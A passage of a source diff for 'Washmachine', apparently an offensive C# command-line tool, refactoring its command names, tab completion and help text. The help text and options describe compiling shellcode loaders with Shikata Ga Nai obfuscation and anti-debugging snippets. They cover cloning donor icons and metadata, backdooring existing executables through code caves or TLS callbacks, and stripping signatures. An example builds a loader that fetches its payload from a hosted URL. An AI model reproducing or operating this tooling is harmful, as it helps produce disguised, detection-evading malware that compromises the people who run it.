@@ -11,19 +11,19 @@ using Washmachine.Testing;
 
 namespace Washmachine.Cli;
 
-public static class Program
+public static partial class Program
 {
     private static readonly JsonSerializerOptions JsonPrint = new() { WriteIndented = false };
     private static readonly Dictionary<string, List<string>> InputHistory = new(StringComparer.OrdinalIgnoreCase);
     private static readonly string[] RootReplCommands =
     {
-        "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help",
+        "encode", "analyze", "backdoor", "strip", "show", "provision", "test", "help",
         "banner", "scheme", "clear", "cls", "exit", "quit", "q"
     };
     private static StartupResult? _startupResult;
     private static readonly string[] SubModeCommands = { "help", "back", "exit", "..", "q" };
-    private static readonly string[] ListTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
-    private static readonly string[] ListTargetsBare = { "templates", "encoders", "snippets", "compilers" };
+    private static readonly string[] ShowTargets = { "all", "encoders", "envelopes", "modules", "templates", "snippets", "compilers", "execution" };
+    private static readonly string[] ShowLegacyTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
     private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext", "text-pad", "tls-callback" };
     private static readonly string[] BackdoorEncryptionValues = { "none" };
     private static readonly string[] BackdoorCarrierValues = { "entry-point" };
@@ -49,10 +49,10 @@ public static class Program
             "--dry-run", "--verbose", "--json"
         },
         ["strip"] = new[] { "-o", "--output", "--mode", "-m", "--section", "--analyze", "--no-trim", "--range" },
-        ["list"] = ListTargets,
+        ["show"] = ShowTargets,
         ["provision"] = new[] { "--core-only" },
         ["test"] = new[] { "--help", "-h" },
-        ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "--all" }
+        ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "show", "provision", "test" }
     };
     private static bool _isRepl;
 
@@ -105,7 +105,8 @@ public static class Program
             "analyze"   => wantsHelp ? PrintAnalyzeUsage() : await RunAnalyzeAsync(cmdArgs),
             "backdoor"  => wantsHelp ? PrintBackdoorUsage() : await RunBackdoorAsync(cmdArgs),
             "strip"     => wantsHelp ? PrintStripUsage() : await RunStripAsync(cmdArgs),
-            "list"      => wantsHelp ? PrintListUsage() : await RunListAsync(cmdArgs),
+            "show"      => wantsHelp ? PrintShowUsage() : await RunShowAsync(cmdArgs),
+            "list"      => wantsHelp ? PrintShowUsage() : await RunShowAsync(cmdArgs),
             "provision" => wantsHelp ? PrintProvisionUsage() : await RunProvisionAsync(cmdArgs),
             "test"      => wantsHelp ? PrintTestUsage() : await TestHarness.RunAsync(cmdArgs),
             "help" or "--help" or "-h" => HandleHelp(cmdArgs),
@@ -123,10 +124,9 @@ public static class Program
             "analyze"   => PrintAnalyzeUsage(),
             "backdoor"  => PrintBackdoorUsage(),
             "strip"     => PrintStripUsage(),
-            "list"      => PrintListUsage(),
+            "show" or "list" => PrintShowUsage(),
             "provision" => PrintProvisionUsage(),
             "test"      => PrintTestUsage(),
-            "--all" or "-a" or "all" => PrintExtendedHelp(),
             _ => PrintUsage(),
         };
     }
@@ -162,7 +162,7 @@ public static class Program
                     AnsiConsole.MarkupLine("[dim]Goodbye.[/]");
                     return 0;
                 case "clear" or "cls":
-                    AnsiConsole.Clear();
+                    try { AnsiConsole.Clear(); } catch { /* non-interactive */ }
                     continue;
                 case "banner":
                     ShowBanner();
@@ -257,6 +257,7 @@ public static class Program
             var cmd = input.Trim();
             if (string.IsNullOrEmpty(cmd)) continue;
             if (cmd.ToLowerInvariant() is "back" or "exit" or ".." or "q") break;
+            if (cmd.ToLowerInvariant() is "clear" or "cls") { try { AnsiConsole.Clear(); } catch { /* non-interactive */ } continue; }
             if (cmd.ToLowerInvariant() is "help" or "?") { helpFunc?.Invoke(); continue; }
 
             var tokens = TokenizeLine(cmd);
@@ -558,6 +559,13 @@ public static class Program
 
     private static IEnumerable<string> GetCommandCompletionMatches(string command, string[] argTokens, int currentArgIndex, string currentPrefix, bool includeSubModeCommands)
     {
+        if (command.Equals(EncodeSessionCompletionCommand, StringComparison.OrdinalIgnoreCase))
+            return GetEncodeSessionCompletionMatches(argTokens, currentArgIndex, currentPrefix);
+        if (command.Equals(StripSessionCompletionCommand, StringComparison.OrdinalIgnoreCase))
+            return GetStripSessionCompletionMatches(argTokens, currentArgIndex, currentPrefix);
+        if (command.Equals(BackdoorSessionCompletionCommand, StringComparison.OrdinalIgnoreCase))
+            return GetBackdoorSessionCompletionMatches(argTokens, currentArgIndex, currentPrefix);
+
         if (command.Equals("help", StringComparison.OrdinalIgnoreCase))
             return currentArgIndex == 0 ? FilterCompletionMatches(CommandOptionCompletions["help"], currentPrefix) : Array.Empty<string>();
 
@@ -566,12 +574,13 @@ public static class Program
         if (valueCandidates.Length > 0)
             return FilterCompletionMatches(valueCandidates, currentPrefix);
 
-        if (command.Equals("list", StringComparison.OrdinalIgnoreCase) && currentArgIndex == 0)
+        if ((command.Equals("show", StringComparison.OrdinalIgnoreCase) || command.Equals("list", StringComparison.OrdinalIgnoreCase))
+            && currentArgIndex == 0)
         {
-            var listCandidates = currentPrefix.StartsWith("-", StringComparison.Ordinal)
-                ? ListTargets
-                : ListTargetsBare.Concat(ListTargets).ToArray();
-            return FilterCompletionMatches(listCandidates, currentPrefix);
+            var showCandidates = currentPrefix.StartsWith("-", StringComparison.Ordinal)
+                ? ShowLegacyTargets
+                : ShowTargets.Concat(ShowLegacyTargets).ToArray();
+            return FilterCompletionMatches(showCandidates, currentPrefix);
         }
 
         var candidates = new List<string>();
@@ -595,6 +604,7 @@ public static class Program
             "backdoor" when previousToken is "--encryption" or "--enc" => BackdoorEncryptionValues,
             "backdoor" when previousToken is "--carrier" or "--invoke" => BackdoorCarrierValues,
             "strip" when previousToken is "--mode" or "-m" => StripModeValues,
+            "show" or "list" when previousToken is "modules" or "module" or "snippets" => GetShowModuleCategoryCandidates(),
             _ => Array.Empty<string>()
         };
     }
@@ -744,403 +754,7 @@ public static class Program
 
     private static async Task<int> RunEncodeAsync(string[] args)
     {
-        if (args.Length == 0)
-        {
-            await PrintEncoderCatalogAsync();
-            return await RunSubMode("encode", RunEncodeAsync, PrintEncodeUsage);
-        }
-
-        string? shellcodeFilePath = null;
-        string? shellcodeHex = null;
-        string? shellcodeUrl = null;
-        string? templateId = null;
-        string? encoderIndex = null;
-        string? envelopeIndex = null;
-        bool shikataGaNai = false;
-        string? shikataEncodeCount = null;
-        string? shikataMaxBytes = null;
-        string shikataPlacement = "pre";
-        string? cloneFromExe = null;
-        bool? cloneResources = null;
-        bool? cloneIcon = null;
-        bool? cloneMetadata = null;
-        string? nopPaddingRaw = null;
-        var snippets = new Dictionary<string, List<string>>(StringComparer.OrdinalIgnoreCase);
-        var textInputs = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
-        bool verbose = false;
-        bool jsonOutput = false;
-
-        for (int i = 0; i < args.Length; i++)
-        {
-            switch (args[i])
-            {
-                case "--shellcode" or "-s" when i + 1 < args.Length:
-                    shellcodeFilePath = args[++i]; break;
-                case "--shellcode-hex" when i + 1 < args.Length:
-                    shellcodeHex = args[++i]; break;
-                case "--shellcode-url" or "-u" when i + 1 < args.Length:
-                    shellcodeUrl = args[++i]; break;
-                case "--template" or "-t" when i + 1 < args.Length:
-                    templateId = args[++i]; break;
-                case "--encoder" or "-e" when i + 1 < args.Length:
-                    encoderIndex = args[++i]; break;
-                case "--envelope" or "-v" when i + 1 < args.Length:
-                    envelopeIndex = args[++i]; break;
-                case "--shikata-ga-nai" or "--sgn":
-                    shikataGaNai = true; break;
-                case "--shikata-enc" when i + 1 < args.Length:
-                    shikataEncodeCount = args[++i]; break;
-                case "--shikata-max" when i + 1 < args.Length:
-                    shikataMaxBytes = args[++i]; break;
-                case "--sgn-placement" when i + 1 < args.Length:
-                    var placementValue = args[++i].Trim().ToLowerInvariant();
-                    if (placementValue != "pre" && placementValue != "post")
-                    {
-                        AnsiConsole.MarkupLine("[red]Error:[/] --sgn-placement must be 'pre' or 'post'.");
-                        return 1;
-                    }
-                    shikataPlacement = placementValue;
-                    break;
-                case "--clone-from" when i + 1 < args.Length:
-                    cloneFromExe = args[++i]; break;
-                case "--clone-resources":
-                    cloneResources = true; break;
-                case "--no-clone-resources":
-                    cloneResources = false; break;
-                case "--clone-icon":
-                    cloneIcon = true; break;
-                case "--no-clone-icon":
-                    cloneIcon = false; break;
-                case "--clone-metadata":
-                    cloneMetadata = true; break;
-                case "--no-clone-metadata":
-                    cloneMetadata = false; break;
-                case "--pad-nops" when i + 1 < args.Length:
-                    nopPaddingRaw = args[++i]; break;
-                case "--snippet" when i + 1 < args.Length:
-                    var kv = args[++i].Split('=', 2);
-                    if (kv.Length == 2)
-                    {
-                        var sectionKey = kv[0];
-                        // Support comma-separated IDs: --snippet antidebugging=Sleep,IsDebuggerPresent
-                        var ids = kv[1].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
-                        if (!snippets.TryGetValue(sectionKey, out var existing))
-                        {
-                            existing = new List<string>();
-                            snippets[sectionKey] = existing;
-                        }
-                        existing.AddRange(ids);
-                    }
-                    break;
-                case "--text" when i + 1 < args.Length:
-                    var tkv = args[++i].Split('=', 2);
-                    if (tkv.Length == 2 && !string.IsNullOrWhiteSpace(tkv[0]))
-                        textInputs[tkv[0].Trim()] = tkv[1];
-                    break;
-                case "--verbose": verbose = true; break;
-                case "--json": jsonOutput = true; break;
-                default:
-                    AnsiConsole.MarkupLine($"[red]Error:[/] Unknown option: {Markup.Escape(args[i])}");
-                    return 1;
-            }
-        }
-
-        if (shellcodeFilePath == null && shellcodeHex == null && shellcodeUrl == null)
-        {
-            AnsiConsole.MarkupLine("[red]Error:[/] provide --shellcode <file>, --shellcode-hex <hex>, or --shellcode-url <url>");
-            return 1;
-        }
-
-        if (cloneFromExe == null && (cloneResources.HasValue || cloneIcon.HasValue || cloneMetadata.HasValue))
-        {
-            AnsiConsole.MarkupLine("[red]Error:[/] --clone-* flags require --clone-from <exe>.");
-            return 1;
-        }
-
-        if (!string.IsNullOrWhiteSpace(cloneFromExe) && !File.Exists(cloneFromExe))
-        {
-            AnsiConsole.MarkupLine($"[red]Error:[/] clone source EXE not found: {Markup.Escape(cloneFromExe)}");
-            return 1;
-        }
-
-        long nopPaddingBytes = 0;
-        if (nopPaddingRaw != null)
-        {
-            if (!long.TryParse(nopPaddingRaw, NumberStyles.Integer, CultureInfo.InvariantCulture, out nopPaddingBytes) || nopPaddingBytes <= 0)
-            {
-                AnsiConsole.MarkupLine("[red]Error:[/] --pad-nops must be a positive integer byte count.");
-                return 1;
-            }
-        }
-
-        if (shikataEncodeCount != null)
-        {
-            if (!int.TryParse(shikataEncodeCount, NumberStyles.Integer, CultureInfo.InvariantCulture, out int count) || count <= 0)
-            {
-                AnsiConsole.MarkupLine("[red]Error:[/] --shikata-enc must be a positive integer.");
-                return 1;
-            }
-
-            shikataGaNai = true;
-            shikataEncodeCount = count.ToString(CultureInfo.InvariantCulture);
-        }
-
-        if (shikataMaxBytes != null)
-        {
-            if (!int.TryParse(shikataMaxBytes, NumberStyles.Integer, CultureInfo.InvariantCulture, out int maxBytes) || maxBytes <= 0)
-            {
-                AnsiConsole.MarkupLine("[red]Error:[/] --shikata-max must be a positive integer.");
-                return 1;
-            }
-
-            shikataGaNai = true;
-            shikataMaxBytes = maxBytes.ToString(CultureInfo.InvariantCulture);
-        }
-
-        if (!string.IsNullOrWhiteSpace(cloneFromExe))
-        {
-            cloneResources ??= true;
-            cloneIcon ??= true;
-            cloneMetadata ??= true;
-        }
-
-        var logger = new ConsoleLogger();
-        if (verbose) logger.VerboseEnabled = true;
-
-        var paths = new AppPaths();
-
-        // Ensure external requirements before compilation.
-        // SGN is provisioned only when Shikata Ga Nai is requested.
-        var provisioner = new RequirementProvisioner(paths, logger);
-        await provisioner.EnsureRequirementsAsync(
-            new ConsoleProgressReporter(),
-            includeOptionalTools: shikataGaNai);
-
-        var runner = new Bin2ShellRunner(paths);
-        var snippetService = new YamlCodeSnippetCatalogService(paths);
-        var toolLocator = new CompilerToolLocator(logger);
-        var compiler = new CompilerService(paths, runner, snippetService, toolLocator, logger);
-
-        // Build UiData from CLI arguments
-        var textBoxes = new Dictionary<string, string>
-        {
-            [UiDataKeys.ShellcodeFile] = shellcodeFilePath ?? "",
-            [UiDataKeys.ShellcodeRaw] = shellcodeHex ?? "",
-            [UiDataKeys.ShellcodeUrl] = shellcodeUrl ?? "",
-            [UiDataKeys.ShellcodeUrlFile] = "",
-            [UiDataKeys.ShikataGaNaiEnabled] = shikataGaNai ? bool.TrueString : bool.FalseString,
-            [UiDataKeys.ShikataGaNaiEncodeCount] = shikataEncodeCount ?? "1",
-            [UiDataKeys.ShikataGaNaiMaxBytes] = shikataMaxBytes ?? "50",
-            [UiDataKeys.ShikataGaNaiPlacement] = shikataPlacement,
-        };
-
-        var comboBoxes = new Dictionary<string, string>
-        {
-            [UiDataKeys.Template] = templateId ?? "shellcode-minimal",
-        };
-
-        // Resolve encoder/envelope display text from catalog
-        var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
-        try
-        {
-            var catalog = await encodingCatalog.GetCatalogAsync();
-
-            if (encoderIndex != null && int.TryParse(encoderIndex, out int encIdx))
-            {
-                var enc = catalog.Encoders.FirstOrDefault(e => e.Index == encIdx);
-                comboBoxes[UiDataKeys.Encoder] = enc?.DisplayText ?? $"{encIdx} - custom";
-            }
-            else
-            {
-                comboBoxes[UiDataKeys.Encoder] = "0 - none";
-            }
-
-            if (envelopeIndex != null && int.TryParse(envelopeIndex, out int envIdx))
-            {
-                var env = catalog.Envelopes.FirstOrDefault(e => e.Index == envIdx);
-                comboBoxes[UiDataKeys.Envelope] = env?.DisplayText ?? $"{envIdx} - custom";
-            }
-            else
-            {
-                comboBoxes[UiDataKeys.Envelope] = "0 - none";
-            }
-        }
-        catch (Exception ex)
-        {
-            logger.Warn($"Could not load encoding catalog: {ex.Message}");
-            comboBoxes[UiDataKeys.Encoder] = encoderIndex != null ? $"{encoderIndex} - custom" : "0 - none";
-            comboBoxes[UiDataKeys.Envelope] = envelopeIndex != null ? $"{envelopeIndex} - custom" : "0 - none";
-        }
-
-        // Apply snippet selections.
-        // Accept both internal format (snippetCombo_ANTISANDBOX_0=Default) and
-        // friendly format (antisandbox=Default) which resolves via the catalog.
-        // For AllowMultiple sections, populate listBoxes; for single-select, use comboBoxes.
-        var listBoxes = new Dictionary<string, List<string>>(StringComparer.OrdinalIgnoreCase);
-        foreach (var kv in snippets)
-        {
-            if (kv.Key.StartsWith("snippetCombo_", StringComparison.OrdinalIgnoreCase))
-            {
-                // Internal combo format: use first value only
-                comboBoxes[kv.Key] = kv.Value.FirstOrDefault() ?? string.Empty;
-            }
-            else if (kv.Key.StartsWith("snippetList_", StringComparison.OrdinalIgnoreCase))
-            {
-                // Internal list format: pass all values
-                listBoxes[kv.Key] = kv.Value;
-            }
-            else if (snippetService.TryResolveSection(kv.Key, out var resolvedSection))
-            {
-                if (resolvedSection.AllowMultiple)
-                {
-                    // Multi-select: write all IDs to the list control
-                    string listName = SnippetControlNaming.GetListName(resolvedSection, 0);
-                    listBoxes[listName] = kv.Value;
-                }
-                else
-                {
-                    // Single-select: use first ID for the combo control
-                    string comboName = SnippetControlNaming.GetComboName(resolvedSection, 0);
-                    comboBoxes[comboName] = kv.Value.FirstOrDefault() ?? string.Empty;
-                }
-            }
-            else
-            {
-                AnsiConsole.MarkupLine($"[yellow]Warning:[/] Unknown snippet section '{Markup.Escape(kv.Key)}'. Use 'list --snippets' to see available sections.");
-            }
-        }
-
-        // Apply default snippets for the selected template
-        if (snippetService.TryGetTemplate(comboBoxes[UiDataKeys.Template], out var tmpl))
-        {
-            foreach (var ph in tmpl.Placeholders.Where(p => p.Kind == TemplatePlaceholderKind.Snippet))
-            {
-                if (!snippetService.TryResolveSection(ph.SnippetTemplateKey, out var section))
-                    continue;
-
-                if (section.AllowMultiple)
-                {
-                    string listName = SnippetControlNaming.GetListName(section, 0);
-                    if (!listBoxes.ContainsKey(listName))
-                    {
-                        var defaultItem = section.Items.FirstOrDefault(si => si.IsDefault)
-                                          ?? section.Items.FirstOrDefault();
-                        if (defaultItem != null)
-                            listBoxes[listName] = new List<string> { defaultItem.Id };
-                    }
-                }
-                else
-                {
-                    string comboName = SnippetControlNaming.GetComboName(section, 0);
-                    if (!comboBoxes.ContainsKey(comboName))
-                    {
-                        var defaultItem = section.Items.FirstOrDefault(si => si.IsDefault)
-                                          ?? section.Items.FirstOrDefault();
-                        if (defaultItem != null)
-                            comboBoxes[comboName] = defaultItem.Id;
-                    }
-                }
-            }
-        }
-
-        // Apply explicit --text inputs (override defaults) — runs regardless of template resolution
-        foreach (var kv in textInputs)
-        {
-            textBoxes[kv.Key] = kv.Value;
-            logger.Debug($"Merged --text input: {kv.Key}={kv.Value}");
-        }
-
-        // Apply default input values (section-level and item-level)
-        foreach (var section in snippetService.GetAllSections())
-        {
-            foreach (var input in section.Inputs)
-            {
-                if (!string.IsNullOrWhiteSpace(input.DefaultValue) && !textBoxes.ContainsKey(input.Id))
-                    textBoxes[input.Id] = input.DefaultValue;
-            }
-
-            foreach (var item in section.Items)
-            {
-                foreach (var input in item.Inputs)
-                {
-                    var scopedKey = CompilerService.BuildScopedInputKey(section.Template, item.Id, input.Id);
-                    if (!string.IsNullOrWhiteSpace(input.DefaultValue) && !textBoxes.ContainsKey(scopedKey))
-                        textBoxes[scopedKey] = input.DefaultValue;
-                }
-            }
-        }
-
-        var data = new UiData(textBoxes, comboBoxes, listBoxes);
-
-        try
-        {
-            var result = jsonOutput
-                ? await compiler.CompileAsync(data)
-                : await AnsiConsole.Status()
-                    .Spinner(Spinner.Known.Dots)
-                    .SpinnerStyle(Style.Parse("cyan"))
-                    .StartAsync("Encoding...", async _ => await compiler.CompileAsync(data));
-
-            var postCompileNotes = new List<string>();
-            bool wantsPostCompile = !string.IsNullOrWhiteSpace(cloneFromExe) || nopPaddingBytes > 0;
-            if (wantsPostCompile &&
-                result.Success &&
-                !string.IsNullOrWhiteSpace(result.OutputExePath) &&
-                File.Exists(result.OutputExePath))
-            {
-                var postCompile = new PePostCompileService(logger);
-                var options = new PostCompileOptions(
-                    cloneFromExe,
-                    cloneResources ?? false,
-                    cloneIcon ?? false,
-                    cloneMetadata ?? false,
-                    nopPaddingBytes);
-                postCompileNotes.AddRange(postCompile.Apply(result.OutputExePath, options));
-            }
-
-            if (jsonOutput)
-            {
-                var output = new
-                {
-                    result.Success,
-                    result.OutputExePath,
-                    result.GeneratedSourcePath,
-                    Notes = result.Notes,
-                    PostCompileNotes = postCompileNotes,
-                    CompilerPath = result.Discovery?.Best?.Path,
-                    ConversionSuccess = result.ConversionResult.Success,
-                    ConversionError = result.ConversionResult.Error,
-                };
-                Console.WriteLine(JsonSerializer.Serialize(output, JsonPrint));
-            }
-            else
-            {
-                foreach (var note in result.Notes)
-                    logger.Info(note);
-                foreach (var note in postCompileNotes)
-                    logger.Info(note);
-
-                if (result.Success)
-                {
-                    AnsiConsole.Write(new Panel("[green3_1]Encoding succeeded.[/]")
-                        .BorderColor(Color.Green)
-                        .Border(BoxBorder.Rounded));
-                }
-                else
-                {
-                    AnsiConsole.Write(new Panel($"[red]Encoding failed: {Markup.Escape(result.ConversionResult.Error ?? "unknown")}[/]")
-                        .BorderColor(Color.Red)
-                        .Border(BoxBorder.Rounded));
-                }
-            }
-
-            return result.Success ? 0 : 1;
-        }
-        catch (Exception ex)
-        {
-            logger.Error($"Fatal: {ex.Message}");
-            return 1;
-        }
+        return await HandleEncodeCommandAsync(args);
     }
 
     // ═══════════════════════════════════════════════════════════════════════
@@ -1808,7 +1422,7 @@ public static class Program
     private static async Task<int> RunBackdoorAsync(string[] args)
     {
         if (args.Length == 0)
-            return await RunSubMode("backdoor", RunBackdoorAsync, PrintBackdoorUsage);
+            return await RunBackdoorInteractiveSessionAsync();
 
         string? peFile = null;
         string? shellcodeFile = null;
@@ -2478,59 +2092,388 @@ public static class Program
         AnsiConsole.MarkupLine($"    {icon} {Markup.Escape(message)}");
     }
 
+    private static CommandUsage[] GetHelpCatalog() =>
+    [
+        BuildEncodeUsage(),
+        BuildAnalyzeUsage(),
+        BuildBackdoorUsage(),
+        BuildStripUsage(),
+        BuildShowUsage(),
+        BuildProvisionUsage(),
+        BuildTestUsage(),
+    ];
+
+    private static CommandUsage BuildEncodeUsage() =>
+        new(
+            Name: "encode",
+            Summary: "Compile a fresh loader from shellcode, raw hex, or a hosted payload URL.",
+            Syntax: "washmachine-cli encode <source> [options]",
+            Description: "The encode pipeline provisions missing tooling when needed, runs Bin2Shell, merges YAML template/snippet selections, and compiles the final loader.",
+            WhenToUse: "Start here when you have payload bytes and want a new loader binary rather than patching an existing PE.",
+            Output: "Creates a compiled executable and keeps source/build artifacts under logging/session_<timestamp>_<slug>/.",
+            OptionGroups:
+            [
+                new UsageOptionGroup(
+                    "Source input (choose one)",
+                    "Provide exactly one payload source per run.",
+                    [
+                        new UsageOption("-s, --shellcode <file>", "Read raw shellcode bytes from a .bin file."),
+                        new UsageOption("--shellcode-hex <hex>", "Inline raw hex bytes such as FC4883E4F0... or \\xfc\\x48\\x83...."),
+                        new UsageOption("-u, --shellcode-url <url>", "Build a web-delivery loader that fetches the payload at runtime."),
+                    ]),
+                new UsageOptionGroup(
+                    "Encoding and build",
+                    "These values control the Bin2Shell stage and the generated loader.",
+                    [
+                        new UsageOption("-t, --template <id>", "Template ID from the active YAML playbook.", "minimal"),
+                        new UsageOption("-e, --encoder <index>", "Bin2Shell encoder index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
+                        new UsageOption("-v, --envelope <index>", "Bin2Shell envelope index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
+                        new UsageOption("--sgn, --shikata-ga-nai", "Enable Shikata Ga Nai preprocessing before compilation."),
+                        new UsageOption("--shikata-enc <count>", "Shikata Ga Nai iteration count. Setting this also enables SGN.", "1"),
+                        new UsageOption("--shikata-max <bytes>", "Maximum SGN decoder-obfuscation bytes. Setting this also enables SGN.", "50"),
+                        new UsageOption("--sgn-placement <mode>", "When to apply SGN relative to the Bin2Shell stage.", "pre", "pre | post"),
+                        new UsageOption("--verbose", "Show detailed progress, compiler output, and warnings."),
+                        new UsageOption("--json", "Emit machine-friendly JSON instead of the styled terminal report."),
+                    ]),
+                new UsageOptionGroup(
+                    "Template overrides",
+                    "Use these flags to steer the playbook without editing YAML.",
+                    [
+                        new UsageOption("--snippet <section>=<id[,id...]>", "Override one snippet section. Multi-select sections accept comma-separated IDs in a single flag or repeated flags."),
+                        new UsageOption("--text <input-id>=<value>", "Provide or override a text input that a template/snippet expects."),
+                    ]),
+                new UsageOptionGroup(
+                    "Post-compile finishing",
+                    "These only apply after a successful compile.",
+                    [
+                        new UsageOption("--clone-from <exe>", "Clone icon, metadata, and resources from another executable."),
+                        new UsageOption("--clone-resources", "Force general resource cloning on when --clone-from is set."),
+                        new UsageOption("--no-clone-resources", "Disable general resource cloning even when --clone-from is set."),
+                        new UsageOption("--clone-icon", "Force icon cloning on when --clone-from is set."),
+                        new UsageOption("--no-clone-icon", "Disable icon cloning even when --clone-from is set."),
+                        new UsageOption("--clone-metadata", "Force VERSIONINFO metadata cloning on when --clone-from is set."),
+                        new UsageOption("--no-clone-metadata", "Disable VERSIONINFO metadata cloning even when --clone-from is set."),
+                        new UsageOption("--pad-nops <bytes>", "Append NOP bytes to inflate the final executable size."),
+                    ]),
+            ],
+            Sections:
+            [
+                new UsageSection(
+                    "What to expect",
+                    Notes:
+                    [
+                        new UsageNote("Provisioning", "Bin2Shell is provisioned automatically before compile. Optional SGN is provisioned automatically when an SGN flag is used."),
+                        new UsageNote("Templates", "The selected template decides which snippet sections exist and which defaults are applied."),
+                        new UsageNote("Snippet syntax", "Use --snippet section=id for single-select sections and --snippet section=id1,id2 for multi-select sections."),
+                        new UsageNote("Discovery", "Run show templates, show modules, and show encoders to inspect live catalog data on this machine."),
+                    ]),
+                new UsageSection(
+                    "Shell and path tips",
+                    Notes:
+                    [
+                        new UsageNote("PowerShell / pwsh", @"Use .\payload.bin or C:\path\payload.bin. Quote paths with spaces, for example "".\My Payloads\payload.bin""."),
+                        new UsageNote("Bash / Zsh", @"Use ./payload.bin or /path/payload.bin. Quote paths with spaces, for example ""./My Payloads/payload.bin""."),
+                        new UsageNote("Raw hex", "If your shell treats backslashes specially, wrap the value in quotes."),
+                    ]),
+            ],
+            Examples:
+            [
+                new UsageExample("washmachine-cli encode -s .\\payload.bin -t minimal", "Compile a minimal loader from a local file.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli encode -s ./payload.bin -e 1 -v 1", "Add a Bin2Shell encoder and envelope to a file-based build.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli encode --shellcode-hex \"FC4883E4F0...\" --snippet antidebugging=IsDebuggerPresentCheck", "Build directly from inline hex and override one snippet.", "Any shell"),
+                new UsageExample("washmachine-cli encode -u https://host/payload.bin --verbose", "Generate a web-delivery loader from a hosted payload URL.", "Any shell"),
+                new UsageExample("washmachine-cli encode -s payload.bin --sgn --shikata-enc 2 --shikata-max 64", "Preprocess shellcode with SGN before the normal encode pipeline.", "Any shell"),
+                new UsageExample("washmachine-cli encode -s payload.bin --clone-from donor.exe --no-clone-icon --pad-nops 1048576", "Finalize the output by cloning donor resources and inflating size.", "Any shell"),
+            ],
+            Related:
+            [
+                new UsageNote("show templates", "See which playbook templates are available before choosing -t."),
+                new UsageNote("show modules", "Inspect section names and snippet IDs used by --snippet."),
+                new UsageNote("show encoders", "Inspect the live Bin2Shell encoder and envelope catalog."),
+                new UsageNote("provision", "Pre-download Bin2Shell if you want tooling ready before your first encode run."),
+            ]);
+
+    private static CommandUsage BuildAnalyzeUsage() =>
+        new(
+            Name: "analyze",
+            Summary: "Inspect a PE file before stripping, patching, or troubleshooting it.",
+            Syntax: "washmachine-cli analyze <pe-file> [options]",
+            Description: "Shows the structural view of a PE so you can pick safer injection and extraction strategies.",
+            WhenToUse: "Use it for recon before backdoor, or when you need a quick read on architecture, sections, imports, entry point, and code caves.",
+            Output: "Prints a styled PE report or JSON.",
+            OptionGroups:
+            [
+                new UsageOptionGroup(
+                    "Input and output",
+                    "Only the target PE is required.",
+                    [
+                        new UsageOption("<pe-file>", "Path to the PE file to inspect."),
+                        new UsageOption("--json", "Emit machine-friendly JSON instead of the styled report."),
+                    ]),
+            ],
+            Sections:
+            [
+                new UsageSection(
+                    "Why it matters",
+                    Bullets:
+                    [
+                        "Use analyze first to confirm x86 vs x64 before choosing an injection method.",
+                        "Code cave output helps you decide whether code-cave or text-pad injection is realistic.",
+                        "The section view is also useful when picking strip modes and raw ranges.",
+                    ]),
+            ],
+            Examples:
+            [
+                new UsageExample("washmachine-cli analyze .\\target.exe", "Inspect a PE interactively before patching it.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli analyze ./target.exe --json", "Feed PE analysis into another script or tool.", "Bash / Zsh"),
+            ],
+            Related:
+            [
+                new UsageNote("backdoor", "Patch the analyzed PE once you know which injection method fits."),
+                new UsageNote("strip", "Use the section and entry-point data to choose a better extraction mode."),
+            ]);
+
+    private static CommandUsage BuildBackdoorUsage() =>
+        new(
+            Name: "backdoor",
+            Summary: "Inject a prepared flat .bin payload into an existing PE file.",
+            Syntax: "washmachine-cli backdoor --pe <file> --shellcode <file> [options]",
+            Description: "Backdoor modifies a target PE after you already know the payload bytes you want to embed.",
+            WhenToUse: "Use it after analyze or strip when the goal is to patch an existing PE rather than compile a new loader.",
+            Output: "Writes a patched PE. Session logs go to logging/backdoor_<timestamp>_<guid>/ unless disabled for the run.",
+            OptionGroups:
+            [
+                new UsageOptionGroup(
+                    "Required input",
+                    "Both files are required for the supported workflow.",
+                    [
+                        new UsageOption("--pe <file>", "Target EXE or DLL to modify."),
+                        new UsageOption("-s, --shellcode <file>", "Flat .bin payload to inject."),
+                    ]),
+                new UsageOptionGroup(
+                    "Injection and output",
+                    "Choose how the payload is placed and where the patched file lands.",
+                    [
+                        new UsageOption("-o, --output <file>", "Destination path for the patched PE.", "<input>.backdoored.exe"),
+                        new UsageOption("-m, --method <method>", "Injection method used to place the payload.", "code-cave", "code-cave | new-section | section-ext | text-pad | tls-callback"),
+                        new UsageOption("--section-name <name>", "Section name used by methods that create PE section data.", ".extra"),
+                        new UsageOption("--cave-min-size <bytes>", "Minimum code-cave size when scanning for code-cave placement."),
+                        new UsageOption("--dry-run", "Analyze feasibility and planned changes without writing an output file."),
+                    ]),
+                new UsageOptionGroup(
+                    "Behavior, compatibility, and logging",
+                    "These flags shape the patching pass and reporting.",
+                    [
+                        new UsageOption("--carrier, --invoke <mode>", "Payload invocation strategy. The current implementation supports entry-point only.", "entry-point", "entry-point"),
+                        new UsageOption("--enc, --encryption <mode>", "Payload encoding/encryption mode. The current implementation supports none only.", "none", "none"),
+                        new UsageOption("--no-remove-sig", "Keep the Authenticode signature instead of removing it."),
+                        new UsageOption("--no-patch-subsystem", "Leave the subsystem unchanged instead of patching to GUI."),
+                        new UsageOption("--no-patch-exit", "Do not rewrite exit behavior after the payload runs."),
+                        new UsageOption("--session-log", "Force per-run session logging on, regardless of saved app settings."),
+                        new UsageOption("--no-session-log", "Force per-run session logging off, regardless of saved app settings."),
+                        new UsageOption("--verbose", "Show detailed discovery and patching logs."),
+                        new UsageOption("--json", "Emit machine-friendly JSON instead of the styled report."),
+                    ]),
+            ],
+            Sections:
+            [
+                new UsageSection(
+                    "Injection methods",
+                    Description: "Pick the least noisy method that still gives you enough space for the payload.",
+                    Notes:
+                    [
+                        new UsageNote("code-cave", "Reuses existing slack space. Stealthier, but limited by discovered cave size."),
